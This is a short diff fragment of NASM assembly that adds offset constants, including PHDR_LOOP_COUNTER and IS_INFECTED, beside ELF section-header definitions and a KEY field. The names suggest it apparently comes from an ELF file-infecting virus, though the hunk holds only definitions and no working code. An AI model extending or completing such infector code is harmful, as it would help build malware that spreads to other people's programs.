@@ -68,6 +68,9 @@
 %define SH_ADDRESS 320
 %define SH_SIZE 330
 %define KEY	340
+%define PHDR_LOOP_COUNTER 350
+%define PHDR_LOOP_OFFSET 358
+%define IS_INFECTED 366
 %define SHDR_BASE 500
 
 struc shdr
